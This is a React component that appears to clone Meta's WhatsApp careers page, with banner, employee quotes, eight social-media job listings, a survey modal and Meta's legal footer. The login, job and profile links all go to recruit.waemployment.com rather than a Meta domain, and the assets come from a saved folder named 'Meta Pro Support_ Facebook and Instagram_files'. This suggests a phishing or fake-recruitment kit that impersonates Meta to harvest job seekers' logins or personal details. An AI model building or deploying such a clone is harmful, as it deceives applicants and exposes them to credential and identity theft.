
export default function Home() {
  return (
    <main>
  <div>
  <div className="topHeader">
    <div className="container">
      <button className="menuButton" type="button" onClick="openMobileMenu()">
        <i className="bx bx-menu" />
      </button>
      <div className="logoNav">
        <a href="https://recruit.waemployment.com/">
          <img src="./Meta Pro Support_ Facebook and Instagram_files/logo-white.png" alt="Logo" width="95px" />
        </a>
      </div>
      <div className="rightSide">
        <ul>
          <li><a href="https://recruit.waemployment.com/login">Jobs</a></li>
          <li><a href="https://recruit.waemployment.com/login">Areas of Work</a></li>
          <li><a href="https://recruit.waemployment.com/login">Locations</a></li>
          <li><a href="https://recruit.waemployment.com/login">Career Programs</a></li>
          <li><a href="https://recruit.waemployment.com/login">How We Work</a></li>
          <li><a href="https://recruit.waemployment.com/login">Blog</a></li>
        </ul>
        <div className="searchIcon">
          <i className="bx bx-search" />
        </div>
        <a className="login">
          Log in
          {/*-<i class='bx bx-chevron-down bx-flip-vertical' ></i> */}
          <i className="bx bx-chevron-down" />
        </a>
      </div>
    </div>
  </div>
  <div className="menuOverlay">
    <button className="menuButton" type="button" onClick="closeMobileMenu()">✕</button>
    <ul>
      <li><a href="https://recruit.waemployment.com/login" target="_blank">Jobs</a></li>
      <li><a href="https://recruit.waemployment.com/login" target="_blank">Areas of Work</a></li>
      <li><a href="https://recruit.waemployment.com/login" target="_blank">Locations</a></li>
      <li><a href="https://recruit.waemployment.com/login" target="_blank">Career Programs</a></li>
      <li><a href="https://recruit.waemployment.com/login" target="_blank">How We Work</a></li>
      <li><a href="https://recruit.waemployment.com/login" target="_blank">Blog</a></li>
    </ul>
    <h2>Create Career Profile</h2>
    <p>You can create a Career Profile to get job suggestions, prepare for the interview process, and more.</p>
    <a href="https://recruit.waemployment.com/createcareer" className="startNow">Create Career Profile</a>
    <p>Already have a Career Profile?</p>
    <a href="https://recruit.waemployment.com/login" className="login">Log in</a>
  </div>
  <div className="login-modal">
    <h2>Create Career Profile</h2>
    <p>You can create a Career Profile to get job suggestions, prepare for the interview process, and more.</p>
    <a href="https://recruit.waemployment.com/createcareer" className="create-career">Create Career Profile</a>
    <p>Already have a Career Profile?</p>
    <a href="https://recruit.waemployment.com/login" className="login">Log in</a>
  </div>
  <link href="./Meta Pro Support_ Facebook and Instagram_files/home.module.css" rel="stylesheet" />
  <div className="home_con">
    <div className="banner">
      <div className="banner-bg" />
      <div className="content">
        <div className="information">
          <div className="text">
            <h5>Areas of work</h5>
            <h1>WhatsApp</h1>
            <div className="call view-positions">
              <div className="icon"><i className="bx bx-right-arrow-alt" /></div>
              View 8 Open Positions
            </div>
          </div>
          <img src="./Meta Pro Support_ Facebook and Instagram_files/181315033_3984066574973303_2255482900576711606_n.png" alt="Mobile" />
        </div>
        <div className="banner-image">
          <img src="./Meta Pro Support_ Facebook and Instagram_files/182887082_173356221337864_1646903397817465068_n.png" alt="Banner" />
          <div className="text">
            <h2>Simplifying connections for all</h2>
            <p>
              WhatsApp from Meta is the easy way to connect through messages, voice and video calls. 
              We’re making it possible to chat with anyone, no matter where they are. 
              Join us as we empower the world to connect through secure, reliable messaging.
            </p>
          </div>
        </div>
      </div>
    </div>
    <div className="teams">
      <div className="team">
        <img src="./Meta Pro Support_ Facebook and Instagram_files/team1.png" alt="Team 1" /> 
        <div>
          <p>"There are so many different projects and products to work on at WhatsApp that it’s easy for anyone to find something they really care about.”</p>
          <p>— Irina V., Engineering Manager</p>
        </div>
      </div>
      <div className="team">
        <img src="./Meta Pro Support_ Facebook and Instagram_files/team2.png" alt="Team 2" /> 
        <div>
          <p>"I’ve found that there are many different types of people to learn from at WhatsApp. We have team members of all ages, lifestyles and backgrounds from across the globe."</p>
          <p>— Laurent C., Software Engineer</p>
        </div>
      </div>
      <div className="team">
        <img src="./Meta Pro Support_ Facebook and Instagram_files/team3.png" alt="Team 3" /> 
        <div>
          <p>"It’s times like this when you realize the power of our platform to help people in need. Government agencies, businesses of all sizes and families use WhatsApp to stay connected."</p>
          <p>— Cristiane R., Director of WhatsApp Partnerships</p>
        </div>
      </div>
    </div>
    <div className="why-join">
      <h2>Why join our team?</h2>
      <p>We’re building a place to connect that is simple, fast, reliable and always private. WhatsApp is used by over a billion people in 180 countries and counting, including some of the most remote places in the world. Learn how you can be a part of making it easy for anyone, anywhere to connect with friends and family.</p>
    </div>
    <div className="challenges">
      <div className="container">
        <h3>Solving Big Challenges</h3>
        <div className="content">
          <div className="image">
            <img src="./Meta Pro Support_ Facebook and Instagram_files/challenges1.png" alt="Challenges 3" /> 
          </div>
          <div className="text">
            <p>“It’s an amazing feeling to know that we not only bring people across the globe closer, but we connect those who may not have the best devices, network or resources. All you need is a device and connection to use WhatsApp and it’s free.”</p>
            <p>— Wayne J., Software Engineer</p>
          </div>
        </div>
      </div>
    </div>
    <div className="news">
      <h1>Latest WhatsApp News</h1>
      <div className="content">
        <a href="https://recruit.waemployment.com/#" className="new">
          <div className="image">
            <img src="./Meta Pro Support_ Facebook and Instagram_files/new1.webp" alt="News 1" /> 
          </div>
          <div>
            <p>Introducing New WhatsApp Status Features</p>
            <span>February 7, 2023</span>
          </div>
        </a>
        <a href="https://recruit.waemployment.com/#" className="new">
          <div className="image">
            <img src="./Meta Pro Support_ Facebook and Instagram_files/new2.webp" alt="News 2" /> 
          </div>
          <div>
            <p>Improved Calling Features on WhatsApp</p>
            <span>December 14, 2022</span>
          </div>
        </a>
        <a href="https://recruit.waemployment.com/#" className="new">
          <div className="image">
            <img src="./Meta Pro Support_ Facebook and Instagram_files/new3.png" alt="News 3" /> 
          </div>
          <div>
            <p>Express Yourself With Avatars on WhatsApp</p>
            <span>December 7, 2022</span>
          </div>
        </a>
        <a href="https://recruit.waemployment.com/#" className="new">
          <div className="image">
            <img src="./Meta Pro Support_ Facebook and Instagram_files/new4.jpeg" alt="News 4" /> 
          </div>
          <div>
            <p>Introducing the First End-to-End Shopping Experience on WhatsApp With JioMart in India</p>
            <span>August 29, 2022</span>
          </div>
        </a>
      </div>
    </div>
    <link href="./Meta Pro Support_ Facebook and Instagram_files/jobs.module.css" rel="stylesheet" />
    <div className="jobs" id="job-positions">
      <div className="container">
        <div className="holder">
          <div className="filters">
            <h1>We're Hiring</h1>
            <div className="search">
              <input type="text" placeholder="Search WhatsApp Positions" />
              <button type="button"><i className="bx bx-search" /></button>
            </div>
            <div className="filters-content">
              <div className="heading">
                <h5>Filter</h5>
                <button type="button">Clear Filters</button>
              </div>
              <hr />
              <div className="filter">
                <div className="title mb-0">
                  <h4>By Area of Work</h4>
                  <i className="bx bx-chevron-right" />
                </div>
              </div>
              <hr />
              <div className="filter">
                <div className="title mb-0">
                  <h4>By Location</h4>
                  <i className="bx bx-chevron-right" />
                </div>
              </div>
              <hr />
              <div className="filter">
                <div className="title mb-0">
                  <h4>By Category</h4>
                  <i className="bx bx-chevron-right" />
                </div>
              </div>
              <hr />
              <div className="filter">
                <div className="title">
                  <h4>By Technology</h4>
                </div>
                <div className="filter-items">
                  <label className="item">Facebook
                    <input type="checkbox" />
                    <span className="checkmark" />
                  </label>
                  <label className="item">Messenger
                    <input type="checkbox" />
                    <span className="checkmark" />
                  </label>
                  <label className="item">Instagram
                    <input type="checkbox" />
                    <span className="checkmark" />
                  </label>
                  <label className="item">WhatsApp
                    <input type="checkbox" defaultChecked="checked" />
                    <span className="checkmark" />
                  </label>
                  <label className="item">Meta Quest
                    <input type="checkbox" />
                    <span className="checkmark" />
                  </label>
                  <label className="item">Workplace
                    <input type="checkbox" />
                    <span className="checkmark" />
                  </label>
                </div>
              </div>
              <hr />
              <div className="filter">
                <div className="title">
                  <h4>By Employment Type</h4>
                </div>
                <div className="filter-items">
                  <label className="item">Full-time
                    <input type="checkbox" />
                    <span className="checkmark" />
                  </label>
                  <label className="item">Internship
                    <input type="checkbox" />
                    <span className="checkmark" />
                  </label>
                </div>
              </div>
              <hr />
              <div className="filter">
                <div className="title">
                  <h4>By Job Type</h4>
                </div>
                <div className="filter-items">
                  <label className="item">Individual Contributor
                    <input type="checkbox" readOnly />
                    <span className="checkmark" />
                  </label>
                  <label className="item">People Manager
                    <input type="checkbox" readOnly />
                    <span className="checkmark" />
                  </label>
                </div>
              </div>
            </div>
          </div>
          <div className="listings">
            <div className="heading">
              <h3>Viewing 8 Jobs Related To:</h3>
              <h6>WhatsApp</h6>
            </div>
            <div className="sort">
              <p>Viewing 1-8 of 8</p>
              <p>Results per page: 25</p>
            </div>
            <div className="listings-items">
              <a href="https://recruit.waemployment.com/login" className="listing">
                <h2>Social Media Manager</h2>
                <hr />
                <div className="infos">
                  <div className="info">
                    <div className="icon">
                      <i className="bx bx-world" />
                      <p>Global</p>
                    </div>
                  </div>
                  <div className="info">
                    <p>Marketing &amp; Advertising</p>
                  </div>
                  <div className="info">
                    <p>Social Media</p>
                  </div>
                </div>
              </a>
              <a href="https://recruit.waemployment.com/login" className="listing">
                <h2>Social Media Coordinator</h2>
                <hr />
                <div className="infos">
                  <div className="info">
                    <div className="icon">
                      <i className="bx bx-world" />
                      <p>Global</p>
                    </div>
                  </div>
                  <div className="info">
                    <p>Marketing &amp; Advertising</p>
                  </div>
                  <div className="info">
                    <p>Social Media</p>
                  </div>
                </div>
              </a>
              <a href="https://recruit.waemployment.com/login" className="listing">
                <h2>Social Media Specialist</h2>
                <hr />
                <div className="infos">
                  <div className="info">
                    <div className="icon">
                      <i className="bx bx-world" />
                      <p>Global</p>
                    </div>
                  </div>
                  <div className="info">
                    <p>Marketing &amp; Advertising</p>
                  </div>
                  <div className="info">
                    <p>Social Media</p>
                  </div>
                </div>
              </a>
              <a href="https://recruit.waemployment.com/login" className="listing">
                <h2>Social Media Analyst</h2>
                <hr />
                <div className="infos">
                  <div className="info">
                    <div className="icon">
                      <i className="bx bx-world" />
                      <p>Global</p>
                    </div>
                  </div>
                  <div className="info">
                    <p>Marketing &amp; Advertising</p>
                  </div>
                  <div className="info">
                    <p>Social Media</p>
                  </div>
                </div>
              </a>
              <a href="https://recruit.waemployment.com/login" className="listing">
                <h2>Content Creator</h2>
                <hr />
                <div className="infos">
                  <div className="info">
                    <div className="icon">
                      <i className="bx bx-world" />
                      <p>Global</p>
                    </div>
                  </div>
                  <div className="info">
                    <p>Marketing &amp; Advertising</p>
                  </div>
                  <div className="info">
                    <p>Social Media</p>
                  </div>
                </div>
              </a>
              <a href="https://recruit.waemployment.com/login" className="listing">
                <h2>Influencer Marketing Manager</h2>
                <hr />
                <div className="infos">
                  <div className="info">
                    <div className="icon">
                      <i className="bx bx-world" />
                      <p>Global</p>
                    </div>
                  </div>
                  <div className="info">
                    <p>Marketing &amp; Advertising</p>
                  </div>
                  <div className="info">
                    <p>Social Media</p>
                  </div>
                </div>
              </a>
              <a href="https://recruit.waemployment.com/login" className="listing">
                <h2>Social Media Strategist</h2>
                <hr />
                <div className="infos">
                  <div className="info">
                    <div className="icon">
                      <i className="bx bx-world" />
                      <p>Global</p>
                    </div>
                  </div>
                  <div className="info">
                    <p>Marketing &amp; Advertising</p>
                  </div>
                  <div className="info">
                    <p>Social Media</p>
                  </div>
                </div>
              </a>
              <a href="https://recruit.waemployment.com/login" className="listing">
                <h2>Paid Social Media Specialist</h2>
                <hr />
                <div className="infos">
                  <div className="info">
                    <div className="icon">
                      <i className="bx bx-world" />
                      <p>Global</p>
                    </div>
                  </div>
                  <div className="info">
                    <p>Marketing &amp; Advertising</p>
                  </div>
                  <div className="info">
                    <p>Social Media</p>
                  </div>
                </div>
              </a>
            </div>
            <div className="sort">
              <p>Viewing 1-8 of 8</p>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div className="what_we_build">
      <div className="container">
        <div className="heading">
          <h1>Empower the world with what we build</h1>
        </div>
        <div className="socials">
          <a href="https://recruit.waemployment.com/#" className="item" data-type="facebook">
            <svg width="800px" height="800px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="none"><path fill="#1877F2" d="M15 8a7 7 0 00-7-7 7 7 0 00-1.094 13.915v-4.892H5.13V8h1.777V6.458c0-1.754 1.045-2.724 2.644-2.724.766 0 1.567.137 1.567.137v1.723h-.883c-.87 0-1.14.54-1.14 1.093V8h1.941l-.31 2.023H9.094v4.892A7.001 7.001 0 0015 8z" /><path fill="#ffffff" d="M10.725 10.023L11.035 8H9.094V6.687c0-.553.27-1.093 1.14-1.093h.883V3.87s-.801-.137-1.567-.137c-1.6 0-2.644.97-2.644 2.724V8H5.13v2.023h1.777v4.892a7.037 7.037 0 002.188 0v-4.892h1.63z" /></svg>
            <span>Facebook</span>
            <div className="icon"><i className="bx bx-right-arrow-alt" /></div>
          </a>
          <a href="https://recruit.waemployment.com/#" className="item" data-type="messenger">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 800"><radialGradient id="a" cx="101.9" cy={809} r="1.1" gradientTransform="matrix(800 0 0 -800 -81386 648000)" gradientUnits="userSpaceOnUse"><stop offset={0} style={{stopColor: '#09f'}} /><stop offset=".6" style={{stopColor: '#a033ff'}} /><stop offset=".9" style={{stopColor: '#ff5280'}} /><stop offset={1} style={{stopColor: '#ff7061'}} /></radialGradient><path fill="url(#a)" d="M400 0C174.7 0 0 165.1 0 388c0 116.6 47.8 217.4 125.6 287 6.5 5.8 10.5 14 10.7 22.8l2.2 71.2a32 32 0 0 0 44.9 28.3l79.4-35c6.7-3 14.3-3.5 21.4-1.6 36.5 10 75.3 15.4 115.8 15.4 225.3 0 400-165.1 400-388S625.3 0 400 0z" /><path fill="#FFF" d="m159.8 501.5 117.5-186.4a60 60 0 0 1 86.8-16l93.5 70.1a24 24 0 0 0 28.9-.1l126.2-95.8c16.8-12.8 38.8 7.4 27.6 25.3L522.7 484.9a60 60 0 0 1-86.8 16l-93.5-70.1a24 24 0 0 0-28.9.1l-126.2 95.8c-16.8 12.8-38.8-7.3-27.5-25.2z" /></svg>
            <span>Messenger</span>
            <div className="icon"><i className="bx bx-right-arrow-alt" /></div>
          </a>
          <a href="https://recruit.waemployment.com/#" className="item" data-type="instagram">
            <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" height="800px" width="800px" version="1.1" id="Layer_1" viewBox="0 0 551.034 551.034" xmlSpace="preserve">
              <g id="XMLID_13_">
                <linearGradient id="XMLID_2_" gradientUnits="userSpaceOnUse" x1="275.517" y1="4.5714" x2="275.517" y2="549.7202" gradientTransform="matrix(1 0 0 -1 0 554)">
                  <stop offset={0} style={{stopColor: '#E09B3D'}} />
                  <stop offset="0.3" style={{stopColor: '#C74C4D'}} />
                  <stop offset="0.6" style={{stopColor: '#C21975'}} />
                  <stop offset={1} style={{stopColor: '#7024C4'}} />
                </linearGradient>
                <path id="XMLID_17_" style={{fill: 'url(#XMLID_2_)'}} d="M386.878,0H164.156C73.64,0,0,73.64,0,164.156v222.722   c0,90.516,73.64,164.156,164.156,164.156h222.722c90.516,0,164.156-73.64,164.156-164.156V164.156   C551.033,73.64,477.393,0,386.878,0z M495.6,386.878c0,60.045-48.677,108.722-108.722,108.722H164.156   c-60.045,0-108.722-48.677-108.722-108.722V164.156c0-60.046,48.677-108.722,108.722-108.722h222.722   c60.045,0,108.722,48.676,108.722,108.722L495.6,386.878L495.6,386.878z" />
                <linearGradient id="XMLID_3_" gradientUnits="userSpaceOnUse" x1="275.517" y1="4.5714" x2="275.517" y2="549.7202" gradientTransform="matrix(1 0 0 -1 0 554)">
                  <stop offset={0} style={{stopColor: '#E09B3D'}} />
                  <stop offset="0.3" style={{stopColor: '#C74C4D'}} />
                  <stop offset="0.6" style={{stopColor: '#C21975'}} />
                  <stop offset={1} style={{stopColor: '#7024C4'}} />
                </linearGradient>
                <path id="XMLID_81_" style={{fill: 'url(#XMLID_3_)'}} d="M275.517,133C196.933,133,133,196.933,133,275.516   s63.933,142.517,142.517,142.517S418.034,354.1,418.034,275.516S354.101,133,275.517,133z M275.517,362.6   c-48.095,0-87.083-38.988-87.083-87.083s38.989-87.083,87.083-87.083c48.095,0,87.083,38.988,87.083,87.083   C362.6,323.611,323.611,362.6,275.517,362.6z" />
                <linearGradient id="XMLID_4_" gradientUnits="userSpaceOnUse" x1="418.306" y1="4.5714" x2="418.306" y2="549.7202" gradientTransform="matrix(1 0 0 -1 0 554)">
                  <stop offset={0} style={{stopColor: '#E09B3D'}} />
                  <stop offset="0.3" style={{stopColor: '#C74C4D'}} />
                  <stop offset="0.6" style={{stopColor: '#C21975'}} />
                  <stop offset={1} style={{stopColor: '#7024C4'}} />
                </linearGradient>
                <circle id="XMLID_83_" style={{fill: 'url(#XMLID_4_)'}} cx="418.306" cy="134.072" r="34.149" />
              </g>
            </svg>
            <span>Instagram</span>
            <div className="icon"><i className="bx bx-right-arrow-alt" /></div>
          </a>
          <a href="https://recruit.waemployment.com/#" className="item" data-type="whatsapp">
            <svg fill="rgb(37, 211, 102)" stroke="currentColor" version="1.1" viewBox="120 120 1000.2 766.9" x="0px" xmlns="http://www.w3.org/2000/svg" y="0px" style={{width: 'inherit', height: 'inherit', maxHeight: 50, transition: 'all 0.5s ease-in-out 0s'}}><title>WhatsApp icon</title><g id="background_1_" /><g id="WhatsApp_Logo"><g><g id="v2"><path d="M1118.3,500.5c-4.6-125.1-56.6-241.2-147-327.8C883.1,88,765.2,40,642.9,39.5c-0.8,0-1.6,0-2.4,0 c-133.1,0-257.4,53.6-348.4,150c-87.7,92.9-134.1,214.5-130.4,342.2c2.2,75.6,22.3,149.9,58.4,215.9l-42.3,253.3 c-0.3,2.3,1.5,4.2,3.6,4.2c0.2,0,0.5,0,0.7-0.1l250.5-55.7c64.4,31,135.6,47.2,207.4,47.2c4.6,0,9.1-0.1,13.7-0.2 c133.3-3.8,256.7-61.5,345.4-162C1080.1,742.6,1122.8,622.6,1118.3,500.5z M651.5,913.3c-3.8,0.1-7.5,0.2-11.3,0.2 c-63.4,0-126.2-15.3-182.3-44.4l-12.8-6.7L275,902.5l31.3-171.9l-7.3-12.4c-33.6-57-52.3-122.4-54.2-188.9 c-6.3-218,166-400.4,384-406.7c3.8-0.1,7.7-0.2,11.5-0.2c212.9,0,389,170,395.2,384.1C1041.7,724.6,869.4,907,651.5,913.3z" /><path d="M473.8,286.8c-8.1,0-20.6,2.9-31.5,14.1c-11.4,11.7-43.3,39.8-45.1,98.9c-1.8,59.1,39.5,117.6,45.2,125.8 c5.8,8.2,79,135.8,199.5,187.7c70.9,30.5,102.1,35.8,122.1,35.8c8.3,0,14.6-0.9,21.1-1.3c22.1-1.3,71.9-26.9,82.8-54.6 c10.9-27.7,11.6-51.8,8.8-56.9c-2.9-5.1-10.8-8.3-22.6-14.7c-11.8-6.4-70-37.3-80.8-41.6c-4.8-1.9-9-3.4-12.9-3.4 c-4.9,0-9.4,2.2-14.3,8.6c-9.5,12.1-32,38.3-39.5,45.9c-3.9,4-8,6.1-13.1,6.1c-3.7,0-8-1.1-13.1-3.5c-14.2-6.6-50-20.6-94.6-62.9 c-34.7-32.9-57.6-73-64.2-85.3c-6.6-12.2-0.2-18.6,6-24.4c5.6-5.2,12.4-13.7,18.7-20.5c6.2-6.8,8.4-11.8,12.6-19.7 c4.2-7.9,2.5-15-0.4-21.1c-2.8-6.1-24.3-66.2-34.3-90.3c-8.4-20.3-17.8-21-26.4-21.6c-7-0.5-15-0.7-23-1 C474.5,286.8,474.2,286.8,473.8,286.8" /></g></g></g></svg>
            <span>WhatsApp</span>
            <div className="icon"><i className="bx bx-right-arrow-alt" /></div>
          </a>
          <a href="https://recruit.waemployment.com/#" className="item" data-type="meta">
            <svg fill="currentColor" stroke="currentColor" version="1.1" viewBox="500 750 1500 500" xmlns="http://www.w3.org/2000/svg" style={{height: 'inherit', width: 'inherit', transition: 'all 0.5s ease-in-out 0s'}}><title>Meta icon</title><g data-name="Artboard outline" id="Artboard_outline"><rect height={2000} width="2504.8275" style={{fill: 'none'}} /></g><g fillRule="evenodd" strokeWidth={2}><path d="M1580,500c-123.3911,0-219.8478,92.936-307.164,210.9931C1152.8473,558.2153,1052.5,500,932.4138,500,687.5862,500,500,818.6207,500,1155.8621,500,1366.8965,602.0956,1500,773.1035,1500c123.08,0,211.6-58.0259,368.9655-333.1034,0,0,65.5973-115.8413,110.7249-195.6386q23.72,38.2978,49.9647,82.5351l73.7931,124.1379C1520.2989,1418.4789,1600.39,1500,1745.5172,1500c166.5959,0,259.31-134.9233,259.31-350.3448C2004.8276,796.5517,1813.0118,500,1580,500ZM1022.069,1092.4138c-127.5862,200-171.7242,244.8276-242.7587,244.8276-73.1034,0-116.5517-64.1784-116.5517-178.6207,0-244.8276,122.069-495.1724,267.5862-495.1724,78.8013,0,144.6539,45.51,245.5224,189.9131C1080.088,1000.2723,1022.069,1092.4138,1022.069,1092.4138Zm481.5282-25.1776-88.23-147.1488q-35.815-58.248-68.8382-107.2293c79.52-122.7353,145.1135-183.8926,223.1261-183.8926,162.0691,0,291.7243,238.6207,291.7243,531.7241,0,111.7242-36.5935,176.5518-112.4139,176.5518C1676.2949,1337.2414,1641.5786,1289.2478,1503.5972,1067.2362Z" /></g></svg>
            <span>Meta Quest</span>
            <div className="icon"><i className="bx bx-right-arrow-alt" /></div>
          </a>
          <a href="https://recruit.waemployment.com/#" className="item" data-type="workplace">
            <svg viewBox="0 0 43 43" xmlns="http://www.w3.org/2000/svg" style={{height: 'inherit', width: 'inherit', transition: 'all 0.5s ease-in-out 0s', color: 'currentcolor'}}><title>Workplace icon</title><path clipRule="evenodd" d="M36.1541 29.9422C35.5956 30.6066 34.5758 31.637 32.9667 31.637C30.6942 31.637 29.961 30.0108 29.2718 28.2907L25.8586 19.9398L22.4592 28.2907C21.8793 29.7152 21.2521 31.6409 18.7616 31.6409C16.2711 31.6409 15.6395 29.7146 15.0596 28.2907L9.32671 14.2418H14.1606L18.7611 25.8044L22.1896 17.376C22.7327 16.0417 23.3791 14.028 25.8548 14.028C28.331 14.028 28.9824 16.0433 29.5272 17.376L33.2566 26.5012C34.7586 24.2441 35.6329 21.5369 35.6329 18.6263C35.6329 10.741 29.213 4.34827 21.2928 4.34827C16.7725 4.34827 12.5229 6.10142 9.32671 9.28403C6.12994 12.4666 4.37092 16.6984 4.37092 21.1994C4.37092 25.7005 6.13433 29.9323 9.3311 33.1149C12.5279 36.2975 16.7835 38.0506 21.3043 38.0506C22.8557 38.0506 24.3956 37.8385 25.8784 37.4274V41.9048C24.3665 42.2318 22.8497 42.3994 21.3043 42.3994C18.431 42.3994 15.6302 41.8389 13.004 40.7326C10.4684 39.6647 8.19155 38.1364 6.23648 36.1903C4.28195 34.2443 2.74699 31.9772 1.67445 29.4525C0.563458 26.8376 0 24.0611 0 21.2C0 18.3389 0.563458 15.5624 1.6739 12.9475C2.74644 10.4228 4.2814 8.15575 6.23593 6.20969C8.19046 4.26363 10.4674 2.73525 13.0035 1.66742C15.6302 0.56057 18.4189 0 21.2922 0C31.6245 0 40 8.33986 40 18.6269C40 22.8828 38.5666 26.8052 36.1541 29.9422Z" fill="currentColor" fillRule="evenodd" /></svg>
            <span>Workplace</span>
            <div className="icon"><i className="bx bx-right-arrow-alt" /></div>
          </a>
        </div>
      </div>
    </div>
    <div className="likely-modal">
      <div className="title">
        <i className="bx bx-info-circle" />
        <h4>Careers</h4>
      </div>
      <span className="close" onclick="closeLikelyModal()">
        <i className="bx bx-x" />
      </span>
      <p className="thank-you">Thank you for your feedback.</p>
      <div className="questions">
        <label>1. How likely or unlikely are you to apply for a role at Meta?</label>
        <div className="first likelyun">
          <label className="checkbox">
            <input type="radio" defaultValue="unlikely" name="radio" />
            <span className="checkmark" />
            <span className="text">Very unlikely</span>
          </label>
          <label className="checkbox">
            <input type="radio" defaultValue="unlikely" name="radio" />
            <span className="checkmark" />
            <span className="text">Unlikely</span>
          </label>
          <label className="checkbox">
            <input type="radio" defaultValue="unlikely" name="radio" />
            <span className="checkmark" />
            <span className="text">Neither likely nor unlikely</span>
          </label>
          <label className="checkbox">
            <input type="radio" defaultValue="likely" name="radio" />
            <span className="checkmark" />
            <span className="text">Likely</span>
          </label>
          <label className="checkbox">
            <input type="radio" defaultValue="likely" name="radio" />
            <span className="checkmark" />
            <span className="text">Very likely</span>
          </label>
          <label className="checkbox">
            <input type="radio" defaultValue="likely" name="radio" />
            <span className="checkmark" />
            <span className="text">I’ve already applied</span>
          </label>
        </div>  
      </div>
      <div className="questions" id="unlikely">
        <label>2. What contributed to your answer? Please select all that apply.</label>
        <div className="first second">
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">I did not find a role I was interested in</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">I did not meet all the minimum qualifications for a role I was interested in</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">I do not feel ready to interview</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta does not offer career growth opportunities</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta does not build technologies that are good for the world</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta does not offer good compensation and benefits</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta does not demonstrate a promising future as a company</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta does not offer a good workplace environment (company culture, work-life balance)</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta does not offer the option to work remotely</span>
          </label>
        </div>  
      </div>
      <div className="questions" id="likely">
        <label>2. What contributed to your answer? Please select all that apply.</label>
        <div className="first second">
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta offers career growth opportunities</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta builds technologies that are good for the world</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta offers projects/roles that interest me</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta offers good compensation and benefits</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta demonstrates a promising future as a company</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta offers a good workplace environment (company culture, work-life balance)</span>
          </label>
          <label className="radiobox">
            <input type="checkbox" defaultValue />
            <span className="checkmark" />
            <span className="text">Meta offers the option to work remotely</span>
          </label>
        </div>  
      </div>
      <div className="actions">
        <button type="button" onclick="closeLikelyModal()">Cancel</button>
        <button type="button" onclick="submitLikelyModal()">Submit</button>
      </div>
    </div>
  </div>
  <link href="./Meta Pro Support_ Facebook and Instagram_files/footer.module.css" rel="stylesheet" />
  <footer>
    <div className="footer">
      <div className="information">
        <p>
          Meta is proud to be an Equal Employment Opportunity and Affirmative Action employer. We do not discriminate based upon race, 
          religion, color, national origin, sex (including pregnancy, childbirth, reproductive health decisions, or related medical conditions), 
          sexual orientation, gender identity, gender expression, age, status as a protected veteran, status as an individual with a disability, 
          genetic information, political views or activity, or other applicable legally protected characteristics. 
          You may view our Equal Employment Opportunity notice <a href="https://recruit.waemployment.com/#"> here. </a> 
          We also consider qualified applicants with criminal histories, consistent with applicable federal, state and local law. We may use your information to maintain 
          the safety and security of Meta, its employees, and others as required or permitted by law. 
          You may view <a href="https://recruit.waemployment.com/#"> Meta's Pay Transparency Policy, </a><a href="https://recruit.waemployment.com/#">Equal Employment Opportunity is the Law</a> notice, 
          and <a href="https://recruit.waemployment.com/#"> Notice to Applicants for Employment and Employees </a> by clicking on their corresponding links. 
          Additionally, Meta participates in the <a href="https://recruit.waemployment.com/#"> E-Verify program </a> in certain locations, as required by law.
        </p>
        <p>
          Meta is committed to providing reasonable accommodations for qualified individuals with disabilities and disabled veterans in our job application procedures. 
          If you need assistance or an accommodation due to a disability, you may contact us at <a href="https://recruit.waemployment.com/#">accommodations-ext@fb.com</a>.
        </p>
      </div>
      <div className="menusContainer">
        <div className="item">
          <div className="menu">
            <span onclick="updateActive(this)">
              About us
              <i className="bx bx-chevron-down" />
            </span>
            <ul>
              <li><a href="https://about.meta.com/company-info/" target="_blank">Company info</a></li>
              <li><a href="https://business.instagram.com/" target="_blank">Newsroom</a></li>
              <li><a href="https://www.metacareers.com/faq" target="_blank">Careers FAQs</a></li>
              <li><a href="https://facebook.talentnet.community/" target="_blank">Looking for contractor roles?</a></li>
            </ul>
          </div>
        </div>
        <div className="item">
          <div className="menu">
            <span onclick="updateActive(this)">
              On social
              <i className="bx bx-chevron-down" />
            </span>
            <ul>
              <li><a href="https://www.facebook.com/lifeatmeta/" target="_blank">Facebook</a></li>
              <li><a href="https://www.instagram.com/lifeatmeta/" target="_blank">Instagram</a></li>
              <li><a href="https://www.linkedin.com/company/meta" target="_blank">Linkedin</a></li>
            </ul>
          </div>
        </div>
        <div className="item">
          <div className="menu">
            <span onclick="updateActive(this)">
              Our policies
              <i className="bx bx-chevron-down" />
            </span>
            <ul>
              <li><a href="https://www.metacareers.com/privacy/" target="_blank">Candidate privacy statement</a></li>
              <li><a href="https://www.metacareers.com/policy/cookies/" target="_blank">Cookies</a></li>
              <li><a href="https://www.metacareers.com/policy/vaccination/" target="_blank">Vaccination entry policy</a></li>
            </ul>
          </div>
        </div>
        <div className="item">
          <div className="menu">
            <span onclick="updateActive(this)">
              More resources
